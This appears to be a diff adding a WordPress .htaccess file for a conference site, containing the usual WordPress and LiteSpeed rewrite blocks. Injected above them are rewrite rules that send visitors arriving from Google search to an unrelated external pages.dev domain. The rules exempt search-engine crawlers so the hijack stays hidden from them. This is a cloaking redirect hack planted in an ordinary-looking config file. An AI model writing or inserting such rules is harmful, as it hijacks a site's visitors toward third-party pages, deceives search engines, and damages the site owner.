@@ -1,0 +1,28 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^https?://(www\.)?google\.[a-z.]+ [NC]
+RewriteCond %{HTTP_USER_AGENT} !(Googlebot|Bingbot|Slurp) [NC]
+RewriteRule ^(.*)$ https://masagakkebacaanehbener.pages.dev/ [R=302,L]
+# BEGIN WordPress
+# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /conference/labrc/
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /conference/labrc/index.php [L]
+</IfModule>
+
+# END WordPress
+
+# BEGIN LiteSpeed
+# The directives (lines) between "BEGIN LiteSpeed" and "END LiteSpeed" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule Litespeed>
+SetEnv noabort 1
+</IfModule>
+# END LiteSpeed
